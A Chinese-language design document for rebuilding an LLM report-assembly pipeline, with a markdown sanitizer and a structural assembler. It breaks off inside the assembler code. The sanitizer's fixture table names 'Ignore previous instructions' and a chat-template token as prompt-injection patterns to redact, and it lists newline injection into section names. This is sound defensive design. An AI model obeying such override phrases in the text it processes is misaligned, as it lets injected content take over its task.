# 报告装配链路 Invariant 重设计 v1.4

> **状态**：APPROVED-FOR-IMPLEMENTATION v1.4（v1.0 → v1.1 用户三问 → v1.2 一轮 12 BLOCKER → v1.3 二轮 8 NEW BLOCKER + 9 MAJOR → v1.4 三轮 0 NEW BLOCKER + 15 落地 checklist）— 已收敛，可开工
>
> **v1.4 收尾要点（三轮 5 路评审 0 NEW BLOCKER 全员"基本收敛"）**：
>
> - 代码审 3 点：KaTeX 补 svg/path/g + 4 类 katex class allowlist；reconciler.types.ts 实际不存在 → 明确为 agent 内联 schema 演进 + 抽出独立类型文件复用；Zod 演进策略改"对象唯一 + 读取侧 wrap"避 LLM structured output 困惑
> - 测试 3 点：fuzzy match 选 `includes(slice(0,8))` 实现一致，删"≥0.7"语义阈值矛盾；§6.5 加 `buildPriorCtx()` 真跑 s8-pre 端到端而非手工注入；§6.6 KaTeX spec 用 Playwright 浏览器环境（避 JSDOM MathML 假阳性）
> - 安全 3 点：mstyle 属性显式限 `mathcolor/mathbackground` 拒；reconciliationReport string 兼容分支同等 `@MaxLength`；`granted_by NOT NULL` + 加 `feature_flag_audit_log` 表
> - 架构合规 2 点：ESLint Section 10 文档内给完整 11 条规则代码；`expectedSectionCount` / `katexAwareSchema` 走 facade 暴露声明
> - 架构师 3 nitpick：recommendations 单源澄清（leaderForeword 唯一 ctx 写入点）；ReportTemplate.id 在 spec 用常量；report.preview Zod schema 加 `.max()` enforce 8KB
>
> **结论**：v1.4 = v1.3 + 15 处落地清单标注 + spec/PR checklist 增量。无方向变更，不需要再开评审轮。
> **作者**：Claude Code session 2026-05-06
> **关联事故**：mission `eafceb32-e8c0-4a8d-a59f-4cdbd33a97f1` 截图 37/38/39
> **范围**：`ai-engine/content/markdown/` + `ai-harness/evaluation/critique/report-artifact/` + `ai-app/agent-playground/services/mission/workflow/stages/s8-* / s10-*`
> **不在范围**：custom-agents 自定义 pipeline 形态（独立议题 v5.2）；report-versions / 章节级重写；Critic L4 评分流。
>
> **v1.3 二轮评审 NEW BLOCKER 修订（5 路并行二轮）**：
>
> 1. **NB-1 ReportTemplate 类型设计**（架构师 + 架构合规一致 BLOCK）：v1.2 三处 `bodyFrom: 'preface' as never /* TODO */` 是 type lie。v1.3 改 discriminated union `bodySource: { kind: 'fromBodies'; field } | { kind: 'fromBuilder'; builder: 'toc' | 'references' | 'foreword' }`，删 `as never`，并将 `DEEP_RESEARCH_TEMPLATE` 改名 `MULTI_DIMENSION_REPORT_TEMPLATE`（中性词，去业务名）。
> 2. **NB-2 MissionContext.reportSegments 字段缺**（代码审）：v1.2 §4.3 拆 s8-pre/s8-final 后未声明 ctx 共享键。v1.3 §4.3 显式声明 `MissionContext.reportSegments?: ReportSegments` + `leaderForeword?: LeaderForewordOutput` 两个字段，spec 锁 ctx schema。
> 3. **NB-3 rehype-sanitize KaTeX schema**（代码审）：默认 schema 把 `<math>/<semantics>/<mrow>` 等 MathML 标签全部剥掉，KaTeX 渲染破。v1.3 §5 PR-A6 提供基于 `defaultSchema` 的扩展 schema（allow MathML tags + class 属性 white-list）。
> 4. **NB-4 PR-A0 reconciliationReport schema 迁移**（代码审 BLOCKER-NEW-1）：当前 `analyst.agent.ts:121-125` 对 `reconciliationReport`（string）调 `.slice`；扩成对象后旧读路径 runtime 炸。v1.3 PR-A0 含 Zod schema 演进 + LLM prompt 更新 + 读路径迁移（`typeof === 'string'` 兼容分支保留 1 release 周期）。
> 5. **NB-5 stage integration spec 缺**（测试）：v1.2 §6 只覆盖 assembler 单元，未覆盖 s8-pre → S10 → s8-final 的 ctx 字段写读链路。v1.3 §6.5 新增 stage-integration.spec，断言 ctx key 名一致 + leaderForeword 写入路径。
> 6. **NB-6 ReportTemplate per-template invariant**（测试）：v1.2 §6.2 `it.each([1,5,12,20])` 公式硬编码 deep-research 形态，对 single-agent freeform 跑出错误结果。v1.3 §6.2 改 invariant spec 参数化 template，引入 `expectedSectionCount(template, segments)` 辅助函数。
> 7. **NB-7 sanitizer fixture 漏 H1→H3 标题跳跃**（测试 M1 残漏）：v1.2 16 fixture 中"标题跳跃"未补。v1.3 §4.1 加 F17（H1→H3 跳级），spec 验 sanitizer 不主动补中间 H2（保留语义），由前端目录组件兼容。
> 8. **NB-8 PR-A5 工作量低估 + 拆分**（架构师 + 代码审一致）：1.5 天对应 5 工种工作（拆 stage / 抽 extractor / ctx 接口扩 / 前端 preview handler / mission-stage-bindings），实际 3 天。v1.3 拆为 PR-A5a/b/c/d 各 ≤1 天。
>
> **v1.3 新增 MAJOR（9 项）**：
>
> - report.preview 前端事件契约定义（§4.3.1 新增）
> - per-workspace 灰度基础设施明确（用 `feature_flag_workspace_grant` 表，§5 PR-A6 详化）
> - PR-A0 新 DTO 字段补 `@MaxLength`（安全 PR-A0 强化）
> - 业务名中性化（`qualityInputs.warnings.dimension` → `scopeKey`，§4.2 改）
> - ESLint Section 10 写出实际代码 diff（不只文档说明，§5 PR-A0）
> - prompt injection 规则纳入 SanitizeRuleApplied enum（不再悬空）
> - PR-A0 工作量 1d → 1.5d（含 schema migration）
> - PR-A6 工作量 1d → 1.5-2d（含 KaTeX schema 调试 + per-workspace 表）
> - dump-playground-fixture.js 列入 PR-A0 文件清单
>
> **v1.2 已修订（保留供溯源）**：B1 字段实证、B2 拆 s8-pre/s8-final、B3 invariant 公式统一、B4 ESLint 路径、B5 qualityInputs schema、B6 stateless、B7 dimensionId、B8 prod fixture、B9-B12 安全 CRITICAL+HIGH 4 条、sanitizer 状态机、命名规范、ReportTemplate Slot[] 抽象、quality 子构建抽出、cache hit / rerun、prompt injection 隔离、thinking signature、sanitizerVersion 持久化、per-workspace 灰度。

---

## 0. TL;DR

把"文档结构决定权"从 LLM 收回到 backend：

- **当前（错的）**：Writer LLM 自由产出 `fullMarkdown`（含全部章节 + H2 + 代码块 + 跨维分析），assembler **回头解析** 这段 markdown 推断 `sections[]`。任何 LLM 输出失误（漏 fence、用 H3 当 H2、写错 dim 名、嵌套错乱）都会导致 sections 错位 → 章节"消失"或"4W 字塞一节"。
- **目标（对的）**：LLM 只产出"每段 body markdown"（不带 H2 标题），backend 按确定性模板拼装 `fullMarkdown`，**拼装时同步构造 `sections[]`**（offset 由 backend 写入，不靠回头解析）。每段 body 入装前 sanitizer 强制配对 fence、剥离嵌入顶级标题。

**核心不变量**：`sections.length === plan.dimensions.length + headTailFixedCount`，物理上不可能错位。

**与 LLM 模型无关**：grok / GPT-4 / Claude / Gemini / DeepSeek 任何模型任何输出怪样，结构永远正确，仅章节内文字内容质量受 LLM 影响。

---

## 1. 背景：mission `eafceb32` 双根因实证

**Leader S2 plan**：12 dimensions
**实际渲染**：仅 10 sections（执行摘要 + 前言 + 目录 + 7 个 dim section），第 10 个 section "企业 AI 落地总成本结构" 字数 **49,244 字**（其他 7K 字），吃掉 dim 8/9/10/11/12 + 跨维度分析 + 风险评估 + 战略建议 + 结论 + 参考文献。

### 真因（已 100% 实证）

#### 直接 trigger（content layer）

Writer 在 dim 7 写了张 mermaid 图，**漏写结尾的三反引号**：

````markdown
```mermaid
graph LR
 A --> B
 end                ← writer 误把 mermaid 的 `end` 当作 fence 闭合
                     （事实上 mermaid 的 end 是图语法，不是 markdown fence）
*标题：...*         ← 此处 fence 仍开着
...                 ← 整个文档剩余内容都被识别为代码块内
## 企业 AI 落地成功案例   ← dim 8 H2 被吞
... 14 个 ## 全部被吞
```
````

DB 实证：fullMarkdown 全文 fence 计数 = **1**（奇数 → 永远不闭合），位置 `offset 104388`。

#### 致命 root cause（assembler layer）

`backend/src/modules/ai-harness/evaluation/critique/report-artifact/report-artifact-assembler.service.ts:878` `buildSectionTree`：

````typescript
for (const line of lines) {
  if (/^(```|~~~)/.test(line.trim())) {
    inCodeBlock = !inCodeBlock;
  } else if (
    !inCodeBlock &&
    line.startsWith("## ") &&
    !line.startsWith("### ")
  ) {
    // 起一个新 section
  }
}
````

**没有"未闭合 fence"防御**：单个 fence 漏关 → `inCodeBlock` 永远 true → 后续所有 H2 全部被识别为代码块内容跳过 → section endOffset 一路延伸到文档末尾。

#### 元 root cause（架构 layer）

更深一层：**只要 `sections[]` 是"解析 LLM 自由产出的 markdown 推断出来"的**，无论加多少防御都是 patch。

LLM 输出有无穷种异常姿势：

- 漏关 fence（本次）
- H2 写成 H3
- 同一份 dim 列表写两遍 H2（本次次要表象，offset 182892+ 那批"暴吼版"标题）
- 标题里嵌入 emoji / 角标
- 标题与 plan dim 名对不上（写成"dim 8.1"而不是"## 企业 AI 落地成功案例"）
- 写完正文嵌入 `[TOC]`
- 把代码块嵌进引用里

**任何一种新姿势都会打中"按 H2 切分"逻辑的某根支柱**。换 LLM 模型只是换异常姿势，不解决问题。

---

## 2. 当前架构 vs 目标架构

### 2.1 当前架构（buildSectionTree 反向解析）

```
plan.dimensions[] ─────────┐
researcherResults[i]:      │
  - fullMarkdown (含H2)    │   ┌──────────────────────────┐
  - chapters[]             ├──→│ Writer LLM (S8)          │
analyst.themeSummary       │   │  自由产出 fullMarkdown   │
reconciliationReport       │   │  - 头部摘要              │
critic 警示                │   │  - 各 dim H2 + body      │
                           ┘   │  - 跨维度 / 风险 / 结论  │
                               └──────────┬───────────────┘
                                          │ fullMarkdown (string)
                                          ▼
                          ┌────────────────────────────────┐
                          │ buildSectionTree (assembler)   │
                          │  按 ^## 切片 + inCodeBlock 状态机│
                          │  失败模式 ↓                    │
                          │  · 奇数 fence → 整文档坍塌     │
                          │  · 标题嵌套错乱 → 切片错位     │
                          │  · dim 名漂移 → dimMatch 失败  │
                          └──────────┬─────────────────────┘
                                     ▼
                              sections[] (脆弱)
```

### 2.2 目标架构（结构化拼装 + 同步构造 sections）

````
plan.dimensions[] ──────┐
researcherResults[i]:   │
  - chapters[]:body     │   ┌────────────────────────────────────┐
analyst.themeSummary    │   │ Writer LLM (S8) 只输出"段 body"   │
reconciliationReport    ├──→│  - executiveSummaryBody (无 H2)   │
critic 警示             │   │  - prefaceBody                     │
                        │   │  - dimBody[i]（每段对应一个 dim）  │
                        │   │  - crossDimBody / riskBody /       │
                        │   │    recommendationBody / conclusionBody │
                        ┘   └─────────┬──────────────────────────┘
                                      │ ReportSegments {bodies, plan}
                                      ▼
                   ┌────────────────────────────────────────────────┐
                   │ MarkdownSanitizer (engine/content)             │
                   │  · 配对 fence (奇数补 ```)                     │
                   │  · 剥离嵌入顶级 # / ##                          │
                   │  · trim 引用块异常                             │
                   └─────────┬──────────────────────────────────────┘
                             │ ReportSegments (sanitized)
                             ▼
                   ┌────────────────────────────────────────────────┐
                   │ StructuralReportAssembler (harness/evaluation) │
                   │  按确定性模板拼装：                            │
                   │   1. frontmatter (backend 控)                  │
                   │   2. ## 执行摘要 + body                        │
                   │   3. ## 前言 + body                            │
                   │   4. ## 目录 (backend 自动生成)                │
                   │   5. for each plan.dimension:                  │
                   │       ## {dim.name}                            │
                   │       {sanitizedBody}                          │
                   │       ★ 拼装时记录 startOffset/endOffset       │
                   │   6. ## 跨维度分析 + body                      │
                   │   7. ## 风险评估 + body                        │
                   │   8. ## 战略建议 + body                        │
                   │   9. ## 结论 + body                            │
                   │   10. ## 参考文献 (backend 自动生成)           │
                   │  同步产出 sections[]：                          │
                   │   · sections.length 严格 ==                    │
                   │     plan.dimensions.length + 9 fixed           │
                   │   · 每段 startOffset/endOffset 由拼装时写入    │
                   └─────────┬──────────────────────────────────────┘
                             │ ReportArtifact { fullMarkdown, sections, ...}
                             ▼
                       前端按 sections 切片渲染（offset 100% 准确）
````

### 2.3 关键不变量（v1.2 公式统一）

**核心公式**：

```
sections.length === FIXED_HEAD + plan.dimensions.length + OPTIONAL_BODY + FIXED_TAIL

其中：
  FIXED_HEAD     = 3 段固定（execSummary + preface + toc）
  plan.dimensions.length = N（动态，由 leader S2 决定）
  OPTIONAL_BODY  = 0-4 段（crossDimAnalysis / riskAssessment / recommendations / conclusion，
                          按 segments.bodies 中对应字段是否非空一一计入）
  FIXED_TAIL     = 1 段固定（references）

故 sections.length 取值范围：[FIXED_HEAD + N + 0 + FIXED_TAIL, FIXED_HEAD + N + 4 + FIXED_TAIL]
  即 [N+4, N+8]

对 N=12 满配：12+8 = 20 段
对 N=12 仅含 conclusion：12+5 = 17 段
对 N=5 最小可选段：5+4 = 9 段
```

| 不变量             | 当前体系                       | 目标体系                                                                                                       |
| ------------------ | ------------------------------ | -------------------------------------------------------------------------------------------------------------- |
| 文档结构           | LLM 决定                       | backend 决定                                                                                                   |
| `sections.length`  | 取决于 LLM 写了多少 H2         | **严格按上述公式**（与 plan + segments.bodies 一一对齐）                                                       |
| section 边界       | LLM 写对 H2 + assembler 解析对 | 拼装时记录 offset，不解析                                                                                      |
| fence 健全性       | LLM 必须写对                   | sanitizer 状态机扫描，逐个未关 fence 就近补关                                                                  |
| dim 名对齐         | LLM 必须写"## {dim.name}"      | backend 自己 prepend H2（`name` 入装前强制 `replace(/[\r\n]/g,' ').trim().slice(0,200)`，杜绝 CRLF 注入 — B9） |
| LLM 模型替换       | 失败模式不可预期               | 失败模式仅影响 body 文字质量                                                                                   |
| dim ↔ section 对齐 | LLM 写对名字才对               | 按 `dimensionId` 查找（B7），index 漂移不影响                                                                  |
| stateless 并发     | —                              | assembler 无实例字段，spec 锁 `Promise.all` 互不污染 — B6                                                      |

---

## 3. 能力归属分析

按 CLAUDE.md 分层原则（公共 → ai-engine，编排 → ai-harness，业务 → ai-app）：

### 3.1 总表

| 模块                                                                           | 归属                | 路径                                                                                                                                                       | 复用方                                                                     |
| ------------------------------------------------------------------------------ | ------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| `MarkdownSanitizer`（fence 配对、剥离 H1/H2、引用 trim）                       | **L2 ai-engine**    | `ai-engine/content/markdown/markdown-sanitizer.utils.ts` （新）                                                                                            | 任何输出 markdown 的 stage：playground / writing / topic-insights / office |
| `MarkdownFenceParser`（已存在 `json-fence-parser.utils.ts` 邻居）              | L2 ai-engine        | `ai-engine/content/json-fence-parser.utils.ts` 同目录                                                                                                      | sanitizer 内部依赖                                                         |
| `StructuralReportAssembler`（按 plan + segments 拼装 fullMarkdown + sections） | **L2.5 ai-harness** | `ai-harness/evaluation/critique/report-artifact/structural-report-assembler.service.ts` （新，与现有 `report-artifact-assembler.service.ts` 并存一段时间） | playground S8 / topic-insights writer / 任何 deep-research 形态业务        |
| `ReportSegments` 接口（writer 返回类型）                                       | L2.5 ai-harness     | `ai-harness/evaluation/critique/report-artifact/report-segments.dto.ts` （新）                                                                             | 跨业务复用                                                                 |
| `WriterPromptTemplate`（约束 LLM 只写 body 不写 H2）                           | L2 ai-engine        | `ai-engine/content/report-template/` 已有，扩 segment 模板集                                                                                               | 任何业务 writer                                                            |
| Writer S8 stage（调 LLM 产 segments）                                          | **L3 ai-app**       | `ai-app/agent-playground/services/mission/workflow/stages/s8-writer-draft-report.stage.ts`                                                                 | playground 专属（每业务可有自己的 writer stage）                           |
| `MarkdownQualityGate.unclosedFenceRule` 新规则                                 | L2.5 ai-harness     | `ai-harness/evaluation/critique/quality-gate/` 已有                                                                                                        | 跨业务复用                                                                 |
| `BuildToc` / `BuildReferences`（目录、参考文献自动生成）                       | L2 ai-engine        | `ai-engine/content/citation/`（已有 citation 工具） + 新 `toc-builder.utils.ts`                                                                            | 跨业务                                                                     |

### 3.2 归属判断逻辑

**公共能力的判断标准**（CLAUDE.md 原则）：

> 问自己："如果明天做一个完全不同的 AI App，这个能力还能复用吗？"
> 能复用 → AI Engine

- **MarkdownSanitizer**：任何 LLM 产出 markdown 都需要此防御。明天做"AI 客服"输出对话 markdown 也用得上 → ✅ engine
- **StructuralReportAssembler**：deep research 形态（research / topic-insights / playground / 未来 custom agent 报告类）共用 ReportArtifact v2 schema → 应在跨业务复用层 → ✅ harness
- **WriterPromptTemplate**：报告写作模板（章节式、提纲式、维度式）跨业务通用 → ✅ engine
- **Writer S8 stage**：playground 14-stage pipeline 中的一站，绑特定 dispatcher / hook / 业务 ctx → ❌ app 专属
- **TocBuilder / ReferencesBuilder**：从 sections + citations 数组渲染 TOC / 参考文献，纯静态映射 → ✅ engine

### 3.3 与既有 facade 边界守护一致

按当前红线（CLAUDE.md "Facade 边界守护"）：

- ai-app/playground/s8 stage 调 `deps.reportAssembler` → 现在是 `report-artifact-assembler.service.ts`，重构后改为新的 `StructuralReportAssembler`，**通过 harness facade 暴露**（不穿透内部路径）
- ai-app/playground/s8 stage 调 `markdownSanitize(...)` → 通过 engine facade 暴露
- 不新增反向依赖（ai-engine 不感知 ai-harness，ai-harness 不感知 ai-app）

---

## 4. 详细模块设计

### 4.1 `MarkdownSanitizer` (ai-engine/content/markdown) — v1.2 升级

**职责**：对一段 markdown body 做"无副作用安全化 + 防 ReDoS / DoS / PII 泄露"，让任何 LLM 怪样输出都能稳定后处理。

**v1.2 关键变更**：

- 命名规范遵循 `standards/16` §六：接口 → `markdown-sanitizer.types.ts`，纯函数实现 → `markdown-sanitizer.util.ts`（单数）
- `json-fence-parser.utils.ts` 一并移入 `ai-engine/content/markdown/`（同关注点聚合，PR-A1 范围）
- 删除 v1.1 的 `language?` 字段（YAGNI，0 规则用到）
- 新增 input size 限制（B11 安全）
- 新增 thinking signature 剥离（v2.1.88 反向洞察 #6）
- 新增 sanitizerVersion 输出字段（持久化兼容，安全 L-1）

**接口（v1.2）**：

```typescript
// ai-engine/content/markdown/markdown-sanitizer.types.ts
export interface SanitizeOptions {
  /** 是否允许保留顶级 H1 / H2（默认 false：剥离让 backend 控；caller 兼容旧调用方时传 true） */
  allowTopLevelHeadings?: boolean;
  /**
   * dim.name 列表 — 仅匹配这些 name 的首行 H2 被剥离（精确剥 H2，不破坏 dim 内合法 H2 子章节）
   * 来源：架构师 M5 反馈（"剥 H2 应仅剥首行 plan.dim.name"）
   */
  knownDimNames?: string[];
  /** 输入 size 上限（B11 安全：防 ReDoS / DoS）；超限 throw `InputTooLargeError` */
  maxInputBytes?: number; // 默认 2_000_000 (2MB)
  /** 超时 abort signal（caller 传入，sanitizer 在长循环中检 .aborted） */
  abortSignal?: AbortSignal;
}

export interface SanitizeResult {
  body: string;
  appliedRules: SanitizeRuleApplied[];
  /** sanitizer 规则集版本，持久化 ReportArtifact.metadata.sanitizerVersion 用 */
  sanitizerVersion: string;
}

export interface SanitizeRuleApplied {
  rule:
    | "unclosed-fence-appended"
    | "top-level-heading-stripped"
    | "embedded-toc-removed"
    | "blockquote-fence-fixed"
    | "thinking-signature-stripped" // v1.2 新增：cross-model fallback 防泄露
    | "crlf-newline-normalized" // v1.2 新增：行尾 \r\n → \n
    | "bom-stripped" // v1.2 新增：开头 BOM 清掉
    | "instruction-injection-redacted"; // v1.3 NB-MAJOR：prompt injection pattern → [indirect prompt redacted]
  count: number;
  /**
   * ⚠️ B12 安全 HIGH：该字段已删除（v1.1 是 positions?: number[]）
   * 不让 sanitizer 详细位置进日志，避免 PII（body 内含用户信息）泄露到日志系统
   */
  /** 严重度（驱动告警阈值）— 代码审 N2 反馈 */
  severity: "low" | "medium" | "high";
  /** 触发段名（让告警能精确到哪段触发，不含 body 内容）— 代码审 N2 反馈 */
  segmentName?: string;
}

export function sanitizeMarkdownBody(
  raw: string,
  opts?: SanitizeOptions,
): SanitizeResult;
```

**核心规则（v1.2 — 状态机扫描，非奇偶计数）**：

1. **Fence 配对（状态机扫描；架构师 M1 反馈）**
   - 不再"全文 fence 计数 + 奇偶判断"，改为 line-by-line 状态机：
     ````
     stack: Array<{type: '```'|'~~~', openLine: number}>
     for each line:
       match fence line ⇒ stack.push 或 stack.pop
       行尾 stack 非空 ⇒ 该行处于 inFence 状态
     end loop:
       stack 中剩余每个未关 fence ⇒ 在原 line 之后第一个 H2 行前 / EOF 前补关
     ````
   - 这样多 fence 嵌套（` ```markdown\n```python\n…\n```\n``` `）也能正确处理
   - mermaid 的 `end` 关键字本来就不被识别为 fence（regex 仅匹配 ` ^``` ` / `^~~~`），不混淆
   - 全角反引号 `｀｀｀` 不识别（不属于 markdown fence，应当原样保留 — 测试覆盖）

2. **顶级标题剥离（精确化 — 架构师 M5 反馈）**
   - `allowTopLevelHeadings === false`（默认）时：仅剥离 `^## {knownDimNames[i]}$` 形式的首行 H2（精确匹配 plan.dim.name）
   - 其他 `^# ` / `^## ` 视情况：若是 body 首行其他文本则保留（用户内容）；若是中间随意 H2 则降为 `### `
   - 例外：明确传 `allowTopLevelHeadings: true` → 完全不动 heading

3. **嵌入 TOC / `[[toc]]` / `[TOC]` 标记移除**：backend 自己生成目录章节

4. **引用块内 fence 修复**：`> ```...` → 提到引用外

5. **trailing 空白 / 重复换行规整**：>2 个 `\n` 折叠为 2

6. **CRLF 行尾归一化**（测试 M1 反馈）：`\r\n` → `\n`，避免 `## title\r` 让 `dimMatch` 失败

7. **BOM 清除**（测试 M1 反馈）：开头 `﻿` 剥掉

8. **thinking signature 剥离**（v2.1.88 反向洞察 #6 + 安全 M-3）：`<thinking>...</thinking>` 整块移除，跨 provider fallback 不泄露

**ReDoS / DoS 防御**（B11 安全）：

- 入口 `if (raw.length > maxInputBytes) throw new InputTooLargeError(...)`
- regex 全部用非回溯写法：`/^\|(?:[-: ]+\|)+$/` 而非 `/^\|[-:\s|]+\|$/`
- 长循环内每 1000 行检查一次 `abortSignal.aborted`

**测试 fixture 套件（v1.2 扩到 16 类，覆盖测试评审 M1 8 类 + 已有 7 类 + B9 注入）**：

| ID  | 描述                                                                                                  | 期望                                                                                    |
| --- | ----------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| F1  | mermaid 孤儿 fence + `end` 关键字（mission eafceb32 真实 case）                                       | 状态机识别未关，EOF 前补关                                                              |
| F2  | dim body 开头 `# 大标题`                                                                              | 降为 `### 大标题`                                                                       |
| F3  | body 含 `[[toc]]\n## 子章节`                                                                          | 移除 toc 标记                                                                           |
| F4  | `> ```json\n{}\n``` ` 引用块内 fence                                                                  | 提到引用外                                                                              |
| F5  | 0 fence + 0 H2 纯文本                                                                                 | noop                                                                                    |
| F6  | 已配对的 fence                                                                                        | noop                                                                                    |
| F7  | 嵌套 fence（` ```markdown\n```py\n...\n```\n``` `）                                                   | 状态机正确（外层未关也能补）                                                            |
| F8  | Windows `\r\n` 行尾                                                                                   | 归一化为 `\n`，dim 名对齐不漂                                                           |
| F9  | 开头 BOM `﻿`                                                                                          | 清除                                                                                    |
| F10 | 行首 1-3 空格 fence                                                                                   | 与 buildSectionTree 一致识别                                                            |
| F11 | ` ``` ` 与 `~~~` 混用 + 不配对                                                                        | 状态机各自栈，独立处理                                                                  |
| F12 | 超长单行（100K+ 无换行 base64 数据）                                                                  | size limit 不超就保留，超限 throw                                                       |
| F13 | HTML 注释 `<!-- ## 假标题 -->`                                                                        | 整段不识别为 H2（assembler 字符串匹配在 sanitizer 之后）                                |
| F14 | 全角反引号 `｀｀｀`                                                                                   | 不识别为 fence，保留                                                                    |
| F15 | `<thinking>...</thinking>` 块                                                                         | 整块剥离                                                                                |
| F16 | dim.name 含 `\n## injected` 注入（B9 安全）                                                           | assembler 入口 strip newline，不进 sanitizer 边界                                       |
| F17 | 标题跳跃（body 开头 `# 大标题` 直接降为 `### 大标题`，跳过 H2）— v1.3 NB-7                            | sanitizer 不主动补中间 H2（保留语义层级），由前端目录组件容忍跳级                       |
| F18 | body 含 `Ignore previous instructions` / `<\|im_start\|>` 等 prompt injection pattern — v1.3 安全 M-1 | sanitizer 应用 `instruction-injection-redacted` 规则替换为 `[indirect prompt redacted]` |

**与既有 `sanitizeSectionOutput`（`ai-engine/llm/output-parsing/sanitize-output.utils.ts`）关系**：

- 该工具已存在但散在 `llm/output-parsing/`，规则集与本 sanitizer 部分重叠
- v1.2 决策：**保留两者**——`sanitizeSectionOutput` 仍负责 LLM 单调输出语义级清洗（白名单/黑名单行级过滤）；`MarkdownSanitizer` 负责文档结构级清洗（fence、H2、注入防御）。两者职责不同，调用顺序：先 `sanitizeSectionOutput` 再 `sanitizeMarkdownBody`

### 4.2 `StructuralReportAssembler` (ai-harness/evaluation/critique/report-artifact)

**职责**：接收 `ReportSegments`（plan + 各段 sanitized body），按确定性模板拼装 `fullMarkdown` + 同步构造 `sections[]`。

**接口（v1.2 — B5/B6/B7 修订）**：

```typescript
// ai-harness/evaluation/critique/report-artifact/report-segments.dto.ts
export interface ReportSegments {
  plan: {
    themeSummary: string;
    /** dimensions[].name 必须已通过 strip-newline + slice(0,200)（B9 安全） */
    dimensions: { id: string; name: string; rationale: string }[];
  };
  bodies: {
    executiveSummary: string; // 已经过 MarkdownSanitizer，不含 H1/H2
    preface: string;
    /**
     * v1.2 B7：从 `string[]` 改为 `Array<{dimensionId, body}>`
     * - 不要求 length === plan.dimensions.length（容忍 partial dim failure）
     * - 按 dimensionId 与 plan.dimensions 关联，缺失的 dim 由 assembler 插入占位文字
     * - body=null 表示该 dim 章节生成失败（明确建模，禁止 undefined / "")
     */
    perDimension: Array<{ dimensionId: string; body: string | null }>;
    crossDimAnalysis?: string;
    riskAssessment?: string;
    recommendations?: string;
    conclusion?: string;
  };
  citations: ArtifactCitation[];
  figures: ArtifactFigure[];
  factTable: ArtifactFactTriple[];
  metadata: ArtifactMetadata;
  /**
   * v1.2 B5：明确 schema，业务无关词。harness 不感知 ai-app 业务概念
   * （writerReport / criticVerdict / reconciliationReport 等业务名禁入此 dto）
   * v1.3 NB-MAJOR：`dimension` → `scopeKey` 中性化（dimension 是 deep-research 业务概念）
   */
  qualityInputs: {
    /** 各 verifier 给的分数（0-100），key 是抽象 verifier id（如 'L3-judge-1' / 'L4-critic'） */
    verifierScores: Record<string, number>;
    /** 反馈给 quality.warnings 的结构化警告（业务无关）；scopeKey 由调方自定义（dim id / segment id / freeform） */
    warnings: Array<{
      severity: "warn" | "error";
      scopeKey: string;
      message: string;
    }>;
    /** 段级覆盖率打分（segmentKey → 0-100） */
    coverageBySegment?: Record<string, number>;
  };
  /** Assembler 用模板（v1.2 M2：北极星泛化为 ReportTemplate Slot[]，详见 §4.2.1） */
  template?: ReportTemplate;
}

// ── v1.3 NB-1 修订：ReportTemplate 类型设计 ───────────────────────────────
// v1.2 用 `bodyFrom: keyof bodies` + `as never` 注释三处 builder slot，是 type lie。
// v1.3 改 discriminated union `bodySource`，编译期严格区分 fromBodies / fromBuilder。

export type SlotBodySource =
  | { kind: "fromBodies"; field: keyof ReportSegments["bodies"] }
  | {
      kind: "fromBuilder";
      builder:
        | "toc"
        | "references"
        | "foreword-preface"
        | "foreword-conclusion"
        | "foreword-recommendations";
    };

export type ReportTemplateSlot =
  | { kind: "fixed"; key: string; title: string; bodySource: SlotBodySource }
  | { kind: "loop"; key: "perDimension"; titleFrom: "plan.dimensions[].name" }
  | {
      kind: "optional";
      key: string;
      title: string;
      bodySource: SlotBodySource;
    };

export interface ReportTemplate {
  /** template id 用于 metrics / observability / sanitizerVersion 关联 */
  id: string;
  slots: ReportTemplateSlot[];
}

/** 多维度报告模板（playground / topic-insights / research 复用，原名 DEEP_RESEARCH_TEMPLATE） */
export const MULTI_DIMENSION_REPORT_TEMPLATE: ReportTemplate = {
  id: "multi-dimension-report@v1",
  slots: [
    {
      kind: "fixed",
      key: "execSummary",
      title: "执行摘要",
      bodySource: { kind: "fromBodies", field: "executiveSummary" },
    },
    {
      kind: "fixed",
      key: "preface",
      title: "前言",
      bodySource: { kind: "fromBuilder", builder: "foreword-preface" },
    },
    {
      kind: "fixed",
      key: "toc",
      title: "目录",
      bodySource: { kind: "fromBuilder", builder: "toc" },
    },
    { kind: "loop", key: "perDimension", titleFrom: "plan.dimensions[].name" },
    {
      kind: "optional",
      key: "crossDim",
      title: "跨维度分析",
      bodySource: { kind: "fromBodies", field: "crossDimAnalysis" },
    },
    {
      kind: "optional",
      key: "risk",
      title: "风险评估",
      bodySource: { kind: "fromBodies", field: "riskAssessment" },
    },
    {
      kind: "optional",
      key: "recommendations",
      title: "战略建议",
      bodySource: { kind: "fromBuilder", builder: "foreword-recommendations" },
    },
    {
      kind: "optional",
      key: "conclusion",
      title: "结论",
      bodySource: { kind: "fromBuilder", builder: "foreword-conclusion" },
    },
    {
      kind: "fixed",
      key: "references",
      title: "参考文献",
      bodySource: { kind: "fromBuilder", builder: "references" },
    },
  ],
};

// ai-harness/evaluation/critique/report-artifact/structural-report-assembler.service.ts
/**
 * ⚠️ B6 强约束：MUST be PURE STATELESS
 *   - 禁止任何实例字段
 *   - assemble() 内所有中间变量局部于方法栈
 *   - 不持有 caller 传入对象的引用（return 必为新对象）
 *   - spec 锁 `Promise.all([assemble(s1), assemble(s2)])` 互不污染
 */
@Injectable()
export class StructuralReportAssembler {
  constructor(
    /** 注入式依赖：方便 spec mock；本身亦是 stateless service */
    private readonly sanitizer: MarkdownSanitizer,
    private readonly qualityVerdictBuilder: QualityVerdictBuilder, // M3：quality 子构建独立服务
    private readonly quickViewBuilder: QuickViewBuilder,
    private readonly factTableBuilder: FactTableBuilder,
    private readonly tocBuilder: TocBuilder, // 新增：自动目录
    private readonly referencesBuilder: ReferencesBuilder, // 新增：自动参考文献
  ) {}

  assemble(segments: ReportSegments): ReportArtifact {
    // 0. 入口防御（B9 安全：strip newlines from dim names）
    const safePlan = this.sanitizePlan(segments.plan);
    // 1. 每段 body 过 sanitizer，传入 knownDimNames 让其精确剥 H2
    const sanitized = this.sanitizeAllBodies(segments.bodies, safePlan);
    // 2. 按 template + safePlan 拼 fullMarkdown，同时记录 offset
    const tpl = segments.template ?? MULTI_DIMENSION_REPORT_TEMPLATE;
    const { fullMarkdown, sectionsOffsets } = this.assembleWithOffsets(
      tpl,
      safePlan,
      sanitized,
      segments,
    );
    // 3. sections[] 由 sectionsOffsets 构造（一一对齐 template + plan）
